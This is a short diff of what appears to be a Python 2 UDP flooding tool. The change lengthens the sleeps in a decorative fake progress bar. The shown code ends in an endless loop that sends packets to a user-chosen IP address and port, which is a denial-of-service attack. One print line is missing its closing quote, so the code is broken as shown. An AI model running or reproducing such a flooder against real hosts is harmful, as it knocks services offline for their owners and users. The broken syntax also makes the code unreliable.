@@ -29,23 +29,23 @@ port = input("Port       : ")
 os.system("clear")
 os.system("figlet kam suru")
 print "[                    ] 0% "
-time.sleep(3)
+time.sleep(8)
 print "[===                 ] 20%"
-time.sleep(3)
+time.sleep(8)
 print "[=====               ] 30%"
-time.sleep(3)
+time.sleep(8)
 print "[=======             ] 45%"
-time.sleep(3)
+time.sleep(8)
 print "[==========          ] 60%"
-time.sleep(3)
+time.sleep(8) 
 print "[=============       ] 75%"
-time.sleep(3)
+time.sleep(8)
 print "[===============     ] 80%"
-time.sleep(3)
+time.sleep(8)
 print "[==================  ] 90%
-time.sleep(3)
+time.sleep(8)
 print "[====================] 100%"
-time.sleep(3)
+time.sleep(8)
 sent = 0
 while True:
      sock.sendto(bytes, (ip,port))
